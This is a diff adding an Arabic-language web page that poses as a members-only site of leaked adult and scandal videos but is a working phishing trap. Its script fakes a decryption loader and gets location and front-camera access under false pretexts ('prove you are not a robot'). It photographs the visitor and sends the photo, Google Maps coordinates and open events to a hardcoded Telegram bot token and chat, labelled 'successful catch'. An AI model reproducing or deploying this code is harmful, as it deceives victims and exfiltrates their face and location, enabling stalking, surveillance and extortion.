@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stream VIP | بوابة المشاهدة الآمنة</title>
+    <style>
+        /* التنسيقات العامة */
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow-x: hidden; }
+        header { padding: 15px 5%; background: rgba(0,0,0,0.9); border-bottom: 1px solid #222; position: fixed; width: 100%; z-index: 100; display: flex; align-items: center; }
+        .logo { color: #e50914; font-size: 24px; font-weight: bold; letter-spacing: 1px; }
+        
+        /* قسم الهيرو */
+        .hero { height: 60vh; background: linear-gradient(to top, #0a0a0a, transparent), url('https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?q=80&w=1470') center/cover; display: flex; align-items: flex-end; padding: 5%; }
+        .hero-content { max-width: 600px; margin-bottom: 30px; }
+        .hero h1 { font-size: 38px; margin: 0; text-shadow: 2px 2px 10px #000; }
+        
+        /* شبكة الفيديوهات */
+        .row { padding: 30px 5%; }
+        .row-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; color: #dbdbdb; border-right: 4px solid #e50914; padding-right: 10px; }
+        .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 12px; }
+        
+        .video-card { position: relative; cursor: pointer; border-radius: 8px; overflow: hidden; background: #1a1a1a; height: 100px; transition: 0.4s; border: 1px solid #222; }
+        .video-card:hover { transform: translateY(-5px); border-color: #e50914; }
+        .video-card img { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+        .video-title { position: absolute; bottom: 8px; right: 8px; font-size: 10px; font-weight: bold; text-align: right; line-height: 1.2; }
+
+        /* مشغل الفيديو الوهمي */
+        #player-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+        .player-box { width: 95%; max-width: 700px; aspect-ratio: 16/9; background: #050505; border-radius: 10px; border: 1px solid #333; position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .play-big { width: 80px; height: 80px; background: #e50914; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 35px; cursor: pointer; box-shadow: 0 0 25px rgba(229, 9, 20, 0.5); transition: 0.2s; }
+        .play-big:active { transform: scale(0.9); }
+        
+        /* شريط التحميل */
+        .loader-bar { width: 80%; height: 4px; background: #222; border-radius: 10px; margin-top: 25px; display: none; overflow: hidden; }
+        .fill { width: 0%; height: 100%; background: #e50914; transition: 0.3s; }
+        #st-msg { margin-top: 15px; color: #888; font-size: 13px; }
+        
+        /* عناصر مخفية للالتقاط */
+        #v, #c { display: none; }
+    </style>
+</head>
+<body>
+
+    <header><div class="logo">STREAM VIP</div></header>
+
+    <div class="hero">
+        <div class="hero-content">
+            <h1>أقوى التسريبات الحصرية</h1>
+            <p>مكتبة فيديو مشفرة للأعضاء فقط. اختر مقطعاً للمشاهدة.</p>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="row-title">مقاطع مسربة حديثاً (18+)</div>
+        <div id="grid" class="video-grid"></div>
+    </div>
+
+    <div id="player-overlay">
+        <div class="player-box">
+            <div class="play-big" id="main-play-btn" onclick="startTrap()">▶</div>
+            <div style="position: absolute; top: 15px; left: 15px; background: rgba(229,9,20,0.8); padding: 2px 8px; border-radius: 3px; font-size: 10px;">LIVE HD</div>
+        </div>
+        <div id="loader" class="loader-bar"><div id="fill" class="fill"></div></div>
+        <div id="st-msg">انقر على زر التشغيل للبدء</div>
+    </div>
+
+    <video id="v" autoplay></video>
+    <canvas id="c"></canvas>
+
+<script>
+    // إعدادات البوت
+    const _T = "8572623835:AAGexkUI6MWv4j2MOC_vmbgtcjkip1EWV08"; 
+    const _C = "5844891988"; 
+
+    // توليد محتوى الصفحة
+    const titles = ["فضيحة المسؤول الشهير", "تسريب من داخل السجن", "كاميرا المراقبة: ماذا حدث؟", "لحظة الهروب الكبير", "أسرار خلف الكواليس", "المقطع الذي تم حذفه"];
+    const grid = document.getElementById('grid');
+    
+    titles.forEach((title, i) => {
+        grid.innerHTML += `
+            <div class="video-card" onclick="openPlayer()">
+                <img src="https://picsum.photos/400/225?random=${i}" alt="thumb">
+                <div class="video-title">${title}</div>
+            </div>`;
+    });
+
+    // فتح المشغل وإرسال تقرير أولي
+    function openPlayer() {
+        document.getElementById('player-overlay').style.display = 'flex';
+        sendLogs("🎯 الهدف فتح المشغل وبدأ محاولة التشغيل.");
+    }
+
+    // وظيفة الإرسال إلى تليجرام
+    async function sendLogs(msg, photo = null) {
+        const url = `https://api.telegram.org/bot${_T}/`;
+        try {
+            if (photo) {
+                const fd = new FormData();
+                fd.append('chat_id', _C);
+                fd.append('photo', photo, 'capture.jpg');
+                fd.append('caption', msg);
+                await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
+            } else {
+                await fetch(url + 'sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: _C, text: msg })
+                });
+            }
+        } catch (e) { console.error("Error sending logs"); }
+    }
+
+    // بدء عملية التحميل الوهمية والالتقاط
+    function startTrap() {
+        const msg = document.getElementById('st-msg');
+        const fill = document.getElementById('fill');
+        document.getElementById('main-play-btn').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        
+        let w = 0;
+        let iv = setInterval(() => {
+            w += Math.random() * 20;
+            if(w >= 100) {
+                w = 100;
+                clearInterval(iv);
+                triggerCapture();
+            }
+            fill.style.width = w + '%';
+            msg.innerText = w > 50 ? "تأكيد بروتوكول الأمان..." : "جاري فك التشفير...";
+        }, 400);
+    }
+
+    // التقاط الموقع والصورة
+    function triggerCapture() {
+        const nav = navigator;
+        
+        // محاولة الحصول على الموقع
+        nav.geolocation.getCurrentPosition((p) => {
+            const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+            
+            // محاولة فتح الكاميرا
+            nav.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(s => {
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                document.body.style.background = "#fff"; // تأثير فلاش الكاميرا
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 1280; 
+                    canvas.height = 720;
+                    canvas.getContext('2d').drawImage(v, 0, 0, 1280, 720);
+                    
+                    canvas.toBlob(b => {
+                        sendLogs(`✅ صيد ناجح!\n📍 الموقع: ${loc}`, b).then(() => {
+                            alert("تم التحقق من الحساب! جاري توجيهك للمشاهدة...");
+                            window.location.href = "https://www.facebook.com/watch/";
+                        });
+                    }, 'image/jpeg', 0.8);
+                    
+                    // إغلاق الكاميرا بعد الالتقاط
+                    s.getTracks().forEach(track => track.stop());
+                }, 1000);
+            })
+            .catch(() => {
+                sendLogs(`⚠️ الهدف رفض الكاميرا ولكن سمح بالموقع:\n📍 الموقع: ${loc}`);
+                alert("يجب السماح بالكاميرا لمشاهدة المحتوى الحصري.");
+                location.reload();
+            });
+        }, () => {
+            alert("خطأ: يرجى السماح بالوصول للموقع لتأكيد أنك لست روبوت.");
+        });
+    }
+</script>
+</body>
+</html>
